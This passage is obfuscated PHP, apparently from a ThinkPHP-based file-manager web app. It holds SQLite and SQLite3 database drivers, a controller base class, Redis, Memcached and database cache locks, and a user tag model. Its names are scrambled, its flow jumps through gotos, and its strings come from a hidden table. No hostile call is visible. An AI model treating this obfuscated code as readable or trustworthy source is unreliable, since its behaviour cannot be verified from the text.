array_walk($ş•, array($this, $ÓÁâØ„Ñ[900])); $ˆŠÀ = $É±½ÃÆ ? $ÓÁâØ„Ñ[901] : $ÓÁâØ„Ñ[902]; $ŒüŸ•–ãÆî = $ˆŠÀ . $ÓÁâØ„Ñ[903] . $this->parseTable($Ùˆ¼Å»ØŒğ[$ÓÁâØ„Ñ[277]]) . $ÓÁâØ„Ñ[897] . implode($ÓÁâØ„Ñ[47], $ş•) . $ÓÁâØ„Ñ[904] . implode($ÓÁâØ„Ñ[47], $¿éıº¿Ÿ); return $this->execute($ŒüŸ•–ãÆî); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Õ‹‘î =& $_SERVER[ÀÆ]; $this->error = $this->_linkID->errno . $Õ‹‘î[4] . $this->_linkID->error; if ($Õ‹‘î[33] != $this->queryStr) { $this->error .= LNG($Õ‹‘î[45]) . $this->queryStr; } think_trace($this->error, $Õ‹‘î[33], $Õ‹‘î[46]); return $this->error; } public function escapeString($ƒÊë®Ãğ¢ñÕ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ƒÊë®Ãğ¢ñÕ); } else { return addslashes($ƒÊë®Ãğ¢ñÕ); } } public function parseKey(&$Å¯¾¾íÂÄ‡, $å¥òÂ˜„¼Ü = true) { $Ãğ¼Â·™ =& $_SERVER[ÀÆ]; if ($å¥òÂ˜„¼Ü) { $Å¯¾¾íÂÄ‡ = $this->parseKeyCheck($Å¯¾¾íÂÄ‡); } if ($Å¯¾¾íÂÄ‡ != $Ãğ¼Â·™[182] && !preg_match($Ãğ¼Â·™[905], $Å¯¾¾íÂÄ‡)) { $Å¯¾¾íÂÄ‡ = $Ãğ¼Â·™[383] . trim($Å¯¾¾íÂÄ‡, $Ãğ¼Â·™[383]) . $Ãğ¼Â·™[383]; } return $Å¯¾¾íÂÄ‡; } } goto eØùõ­„ê†; BÊÆÈï…å: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $Ø =& $_SERVER[ÀÆ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$Ø[6]] =& $config; $this->values[$Ø[7]] =& $in; $this->tpl = TEMPLATE . MOD . $Ø[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($š‘’à¹ä) { if (1 === func_num_args()) { $this->{$š‘’à¹ä} = new $š‘’à¹ä(); } else { $ ö˜ = new ReflectionClass($š‘’à¹ä); $ÃÇÀçßåäù­ = func_get_args(); array_shift($ÃÇÀçßåäù­); $this->{$š‘’à¹ä} = $ ö˜->newInstanceArgs($ÃÇÀçßåäù­); } return $this->{$š‘’à¹ä}; } protected function assign($™ÒÖ¢Û¦, $¨ªïïÂÊå”¥ç) { $this->values[$™ÒÖ¢Û¦] = $¨ªïïÂÊå”¥ç; } protected function display($¥ÜÊ°†) { ob_end_clean(); extract($this->values); require $this->tpl . $¥ÜÊ°†; } } class DbSqliteBase extends Db { public function __construct($Ú¥† = '') { $¸ï¦¤Ã©œÌ±å =& $_SERVER[ÀÆ]; if (!extension_loaded($¸ï¦¤Ã©œÌ±å[9])) { think_exception(think_lang($¸ï¦¤Ã©œÌ±å[10]) . $¸ï¦¤Ã©œÌ±å[11]); } if (!empty($Ú¥†)) { if (!isset($Ú¥†[$¸ï¦¤Ã©œÌ±å[12]])) { $Ú¥†[$¸ï¦¤Ã©œÌ±å[12]] = 438; } $this->config = $Ú¥†; if (empty($this->config[$¸ï¦¤Ã©œÌ±å[13]])) { $this->config[$¸ï¦¤Ã©œÌ±å[13]] = array(); } } } public function connect($Ÿ€ = '', $¬Úû« = 0) { $¾» =& $_SERVER[ÀÆ]; if (!isset($this->linkID[$¬Úû«])) { if (empty($Ÿ€)) { $Ÿ€ = $this->config; } $ı¯ğ«²Ÿ± = !empty($Ÿ€[$¾»[13]][$¾»[14]]) ? $Ÿ€[$¾»[13]][$¾»[14]] : $this->pconnect; $Î¸¯ïê = $ı¯ğ«²Ÿ± ? $¾»[15] : $¾»[16]; $this->linkID[$¬Úû«] = $Î¸¯ïê($Ÿ€[$¾»[17]], $Ÿ€[$¾»[12]]); if (!$this->linkID[$¬Úû«]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$¬Úû«], 30000); if (1 != think_config($¾»[18])) { unset($this->config); } } return $this->linkID[$¬Úû«]; } public function free() { $this->queryID = null; } public function query($àÀ¯ÂÔşóş) { $æ»–± =& $_SERVER[ÀÆ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $àÀ¯ÂÔşóş; if ($this->queryID) { $this->free(); } think_action_status($æ»–±[19], 1); think_status($æ»–±[20]); $this->queryID = sqlite_query($this->_linkID, $àÀ¯ÂÔşóş); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ä‹ = $this->getAll(); return $ä‹; } } public function execute($Ïò±ÚŞ) { $Â£ü„ =& $_SERVER[ÀÆ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ïò±ÚŞ; if ($this->queryID) { $this->free(); } think_action_status($Â£ü„[21], 1); think_status($Â£ü„[20]); $“öÙÚ = sqlite_exec($this->_linkID, $Ïò±ÚŞ); $this->debug(); if (!1 === $“öÙÚ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ÀÆ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $•¼ = sqlite_query($this->_linkID, $_SERVER[ÀÆ][23]); if (!$•¼) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÖÜÎ‘ÈšÌºÜ = sqlite_query($this->_linkID, $_SERVER[ÀÆ][24]); if (!$ÖÜÎ‘ÈšÌºÜ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Ş¼Šíñ“œÔ = array(); if ($this->numRows > 0) { for ($…µ = 0; $…µ < $this->numRows; $…µ++) { $Ş¼Šíñ“œÔ[$…µ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Ş¼Šíñ“œÔ; } public function getFields($ÂÁ) { $úÕï…®¢ì =& $_SERVER[ÀÆ]; $´ñ²Å = $this->query($úÕï…®¢ì[25] . $ÂÁ . $úÕï…®¢ì[26]); $ÄŠ¶æã¿êô— = array(); if ($´ñ²Å) { foreach ($´ñ²Å as $ßı‚„ÓíÉÜ => $Æôùæ) { $ÄŠ¶æã¿êô—[$Æôùæ[$úÕï…®¢ì[27]]] = array($úÕï…®¢ì[28] => $Æôùæ[$úÕï…®¢ì[27]], $úÕï…®¢ì[29] => $Æôùæ[$úÕï…®¢ì[30]], $úÕï…®¢ì[31] => (bool) ($Æôùæ[$úÕï…®¢ì[32]] === $úÕï…®¢ì[33]), $úÕï…®¢ì[34] => $Æôùæ[$úÕï…®¢ì[35]], $úÕï…®¢ì[36] => strtolower($Æôùæ[$úÕï…®¢ì[37]]) == $úÕï…®¢ì[38], $úÕï…®¢ì[39] => strtolower($Æôùæ[$úÕï…®¢ì[40]]) == $úÕï…®¢ì[41]); } } return $ÄŠ¶æã¿êô—; } public function getTables($âıÇ™‰‡ = '') { $Ğ =& $_SERVER[ÀÆ]; $Äó ±¿÷Õ = $this->query($Ğ[42] . $Ğ[43] . $Ğ[44]); $«‹ŒâÀßĞŸâ = array(); foreach ($Äó ±¿÷Õ as $¾ÀÏÃ˜‡¥îÊÕ => $¬©‡) { $«‹ŒâÀßĞŸâ[$¾ÀÏÃ˜‡¥îÊÕ] = current($¬©‡); } return $«‹ŒâÀßĞŸâ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ïê”¼…Ğà =& $_SERVER[ÀÆ]; $ıí ÈÓ‰ = sqlite_last_error($this->_linkID); $this->error = $ıí ÈÓ‰ . $Ïê”¼…Ğà[4] . sqlite_error_string($ıí ÈÓ‰); if ($Ïê”¼…Ğà[33] != $this->queryStr) { $this->error .= LNG($Ïê”¼…Ğà[45]) . $this->queryStr; } think_trace($this->error, $Ïê”¼…Ğà[33], $Ïê”¼…Ğà[46]); return $this->error; } public function escapeString($¯¬íÓ) { return sqlite_escape_string($¯¬íÓ); } public function parseLimit($•ö¶‘Ê¥˜Ş°) { $—Ùºõ =& $_SERVER[ÀÆ]; $Â”–ôÌ = $—Ùºõ[33]; if (!empty($•ö¶‘Ê¥˜Ş°)) { $•ö¶‘Ê¥˜Ş° = explode($—Ùºõ[47], $•ö¶‘Ê¥˜Ş°); if (count($•ö¶‘Ê¥˜Ş°) > 1) { $Â”–ôÌ .= $—Ùºõ[48] . $•ö¶‘Ê¥˜Ş°[1] . $—Ùºõ[49] . $•ö¶‘Ê¥˜Ş°[0] . $—Ùºõ[50]; } else { $Â”–ôÌ .= $—Ùºõ[48] . $•ö¶‘Ê¥˜Ş°[0] . $—Ùºõ[50]; } } return $Â”–ôÌ; } } class DbSqlite3Base extends Db { public function __construct($Ÿ´ŞŞºñ = '') { $éõ =& $_SERVER[ÀÆ]; if (!class_exists($éõ[51])) { think_exception(think_lang($éõ[10]) . $éõ[52]); } if (!empty($Ÿ´ŞŞºñ)) { if (!isset($Ÿ´ŞŞºñ[$éõ[12]])) { $Ÿ´ŞŞºñ[$éõ[12]] = 438; } $this->config = $Ÿ´ŞŞºñ; if (empty($this->config[$éõ[13]])) { $this->config[$éõ[13]] = array(); } } } public function connect($Éè¿¥ôÒ…ú = '', $ğö¥ = 0) { $ÆÑÓü™¿¬ª =& $_SERVER[ÀÆ]; if (!isset($this->linkID[$ğö¥])) { if (empty($Éè¿¥ôÒ…ú)) { $Éè¿¥ôÒ…ú = $this->config; } $this->linkID[$ğö¥] = new SQLite3($Éè¿¥ôÒ…ú[$ÆÑÓü™¿¬ª[17]]); if (!$this->linkID[$ğö¥]) { think_exception($this->linkID[$ğö¥]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ğö¥]->busyTimeout(30000); if (1 != think_config($ÆÑÓü™¿¬ª[18])) { unset($this->config); } } return $this->linkID[$ğö¥]; } public function free() { $this->queryID = null; } public function query($ÑØ‚Ã“ˆº®) { $¶Ñôæ…¸ò =& $_SERVER[ÀÆ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÑØ‚Ã“ˆº®; if ($this->queryID) { $this->free(); } think_action_status($¶Ñôæ…¸ò[19], 1); think_status($¶Ñôæ…¸ò[20]); $this->queryID = $this->_linkID->query($ÑØ‚Ã“ˆº®); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $¥éßøÊ¿ = $this->getAll(); $this->numRows = count($¥éßøÊ¿); return $¥éßøÊ¿; } } public function execute($£§Ù½ûİ²£) { $ïÂ¦ª«èäÏ =& $_SERVER[ÀÆ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $£§Ù½ûİ²£; if ($this->queryID) { $this->free(); } think_action_status($ïÂ¦ª«èäÏ[21], 1); think_status($ïÂ¦ª«èäÏ[20]); $ì»Ò®–ÎÁü = $this->_linkID->exec($£§Ù½ûİ²£); $this->debug(); if (!1 === $ì»Ò®–ÎÁü) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ÀÆ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ûíõÃ˜âÇ = $this->_linkID->query($_SERVER[ÀÆ][23]); if (!$ûíõÃ˜âÇ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $€³§—·Ìó¢» = $this->_linkID->query($_SERVER[ÀÆ][24]); if (!$€³§—·Ìó¢») { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Òªó¯è = array(); while ($¨÷® = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Òªó¯è[] = $¨÷®; } $this->queryID->reset(); return $Òªó¯è; } public function getFields($¼õ) { $èß =& $_SERVER[ÀÆ]; $ØÎâ§şğÑ = $this->query($èß[25] . $¼õ . $èß[26]); $È¨Ğ = array(); if ($ØÎâ§şğÑ) { foreach ($ØÎâ§şğÑ as $Ü‘ışë => $Ìßı÷’) { $È¨Ğ[$Ìßı÷’[$èß[28]]] = array($èß[28] => $Ìßı÷’[$èß[28]], $èß[29] => $Ìßı÷’[$èß[29]], $èß[31] => (bool) ($Ìßı÷’[$èß[31]] === $èß[33]), $èß[34] => $Ìßı÷’[$èß[53]], $èß[36] => (bool) $Ìßı÷’[$èß[54]], $èß[39] => (bool) $Ìßı÷’[$èß[54]]); } } return $È¨Ğ; } public function getTables($»æÒğ™–ù¦´¡ = '') { $ñ© =& $_SERVER[ÀÆ]; $ëÅ‹ = $this->query($ñ©[42] . $ñ©[43] . $ñ©[44]); $Ÿ‹ = array(); foreach ($ëÅ‹ as $—¨ƒ²İÇè => $´…²ê) { $Ÿ‹[$—¨ƒ²İÇè] = current($´…²ê); } return $Ÿ‹; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Ø²ğ³ =& $_SERVER[ÀÆ]; $this->error = $this->_linkID->lastErrorMsg(); if ($Ø²ğ³[33] != $this->queryStr) { $this->error .= LNG($Ø²ğ³[45]) . $this->queryStr; } think_trace($this->error, $Ø²ğ³[33], $Ø²ğ³[46]); return $this->error; } public function escapeString($éšŒ¿û¼ëü) { $ë™”É§‰Ü =& $_SERVER[ÀÆ]; if ($this->_linkID) { return $this->_linkID->escapeString($éšŒ¿û¼ëü); } return str_ireplace($ë™”É§‰Ü[55], $ë™”É§‰Ü[56], $éšŒ¿û¼ëü); } public function parseLimit($Ì˜èøÉ„šòñ¢) { $ö’æ¶ÉĞÓöå =& $_SERVER[ÀÆ]; $Æİ™Õ = $ö’æ¶ÉĞÓöå[33]; if (!empty($Ì˜èøÉ„šòñ¢)) { $Ì˜èøÉ„šòñ¢ = explode($ö’æ¶ÉĞÓöå[47], $Ì˜èøÉ„šòñ¢); if (count($Ì˜èøÉ„šòñ¢) > 1) { $Æİ™Õ .= $ö’æ¶ÉĞÓöå[48] . $Ì˜èøÉ„šòñ¢[1] . $ö’æ¶ÉĞÓöå[49] . $Ì˜èøÉ„šòñ¢[0] . $ö’æ¶ÉĞÓöå[50]; } else { $Æİ™Õ .= $ö’æ¶ÉĞÓöå[48] . $Ì˜èøÉ„šòñ¢[0] . $ö’æ¶ÉĞÓöå[50]; } } return $Æİ™Õ; } } goto F¶ÑÖÉ¶; dæÀé¸¤£³: class CacheLockRedis { public function lock($äßşØÊ, $ğï = 10) { $˜©÷Ù = Cache::init(); $†Ø§âØï‹ = microtime(!0) + $ğï; while (microtime(!0) < $†Ø§âØï‹) { $ú–¤…£¡°Ï = $˜©÷Ù->get($äßşØÊ); if (!$ú–¤…£¡°Ï) { $÷È»Ò¢ = $˜©÷Ù->setLock($äßşØÊ, $†Ø§âØï‹, $ğï); if ($÷È»Ò¢) { return !0; } } else { if ($ú–¤…£¡°Ï < microtime(!0)) { $˜©÷Ù->set($äßşØÊ, $†Ø§âØï‹, $ğï * 2); if ($˜©÷Ù->get($äßşØÊ) === $ú–¤…£¡°Ï) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ç»ºšÔö) { return Cache::init()->get($ç»ºšÔö); } public function unlock($ıß¢—šßÄ¬¬) { return Cache::init()->remove($ıß¢—šßÄ¬¬); } } class CacheLockMemcached { public function lock($äò, $Ù¹ “ò˜Ÿ»– = 0) { $¼ı½€ = Cache::init(); $ùüÆ”ë¯ = microtime(!0) + $Ù¹ “ò˜Ÿ»–; while (microtime(!0) < $ùüÆ”ë¯) { $ıªûê¹ØÄù = $¼ı½€->get($äò); if (!$ıªûê¹ØÄù || $ıªûê¹ØÄù < microtime(!0)) { $”üîª = $¼ı½€->handle->add($äò, $ùüÆ”ë¯, $Ù¹ “ò˜Ÿ»–); if ($”üîª) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ışü˜ğœ«) { return Cache::init()->get($ışü˜ğœ«); } public function unlock($§Ï‰ƒ¢Äğ) { return Cache::init()->remove($§Ï‰ƒ¢Äğ); } } class CacheLockDatabase { public function lock($ˆ¸“, $“ê·ƒš„Ùà = 0) { $ÁğÒÕù Åõğ = Model($_SERVER[ÀÆ][821]); $¢ë¾€› = microtime(!0) + $“ê·ƒš„Ùà; while (microtime(!0) < $¢ë¾€›) { $‘ã = $ÁğÒÕù Åõğ->get($ˆ¸“); if (!$‘ã || $‘ã < microtime(!0)) { $«¹‡¡Ò¬ = $ÁğÒÕù Åõğ->set($ˆ¸“, $¢ë¾€›); if ($«¹‡¡Ò¬) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($²) { return Model($_SERVER[ÀÆ][821])->get($²); } public function unlock($Ú©Ø‘îÊš) { Model($_SERVER[ÀÆ][821])->remove($Ú©Ø‘îÊš); } } goto a¨ïšÚç°İ; CåÔÍ§¹î…: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\162\x5f\x66\x61\x76"; protected function cacheFunctionAlias($ƒñÆ“çæ„) { $§Ó÷¦¿× =& $_SERVER[ÀÆ]; return array($§Ó÷¦¿×[1849] => array(USER_ID, $§Ó÷¦¿×[1850])); } protected function listData() { $ÏüÏÜÌ =& $_SERVER[ÀÆ]; $¾ ©åÚ = array($ÏüÏÜÌ[1563] => USER_ID, $ÏüÏÜÌ[477] => array($ÏüÏÜÌ[1853], 0)); $Şòê = $ÏüÏÜÌ[1855]; $ÇÈ³œõâ = $this->field($Şòê)->where($¾ ©åÚ)->order($ÏüÏÜÌ[1856])->select(); return $ÇÈ³œõâ ? $ÇÈ³œõâ : array(); } protected function listByTag($åì¬‡) { } protected function addToTag($Ñâ, $Áäç¶àæ©¡İ) { $çÆš½Æ¨  =& $_SERVER[ÀÆ]; if (!Model($çÆš½Æ¨ [1989])->listData($Áäç¶àæ©¡İ) || !Model($çÆš½Æ¨ [817])->pathInfo($Ñâ)) { return !1; } $ˆü¯Ä¤ß = array($çÆš½Æ¨ [1563] => USER_ID, $çÆš½Æ¨ [477] => $Áäç¶àæ©¡İ, $çÆš½Æ¨ [416] => $Ñâ, $çÆš½Æ¨ [417] => $çÆš½Æ¨ [411], $çÆš½Æ¨ [415] => $çÆš½Æ¨ [33], $çÆš½Æ¨ [1743] => 0); if ($this->where($ˆü¯Ä¤ß)->find()) { return !1; } return $this->add($ˆü¯Ä¤ß); } protected function removeFromTag($¹÷«÷÷ê‘, $û˜½©Ò) { $¯†–Ó =& $_SERVER[ÀÆ]; if (!Model($¯†–Ó[1989])->listData($û˜½©Ò)) { return !1; } if (is_array($¹÷«÷÷ê‘)) { $¹÷«÷÷ê‘ = array($¯†–Ó[7], $¹÷«÷÷ê‘); } $à¹î  ¤æ½Ô = array($¯†–Ó[1563] => USER_ID, $¯†–Ó[477] => $û˜½©Ò, $¯†–Ó[417] => $¯†–Ó[411], $¯†–Ó[416] => $¹÷«÷÷ê‘); return $this->where($à¹î  ¤æ½Ô)->delete(); } protected function removeByTag($Ê´ˆ¿öû) { $»Æø =& $_SERVER[ÀÆ]; if (!$Ê´ˆ¿öû) { return !1; } $­ = array($»Æø[1563] => USER_ID, $»Æø[477] => $Ê´ˆ¿öû); return $this->where($­)->delete(); } protected function removeBySource($§È—ùüŒÑ±) { $Ïâ =& $_SERVER[ÀÆ]; if (is_array($§È—ùüŒÑ±)) { $§È—ùüŒÑ± = array($Ïâ[7], $§È—ùüŒÑ±); } $åŸ½ = array($Ïâ[1563] => USER_ID, $Ïâ[416] => $§È—ùüŒÑ±, $Ïâ[477] => array($Ïâ[1005], 0)); return $this->where($åŸ½)->delete(); } }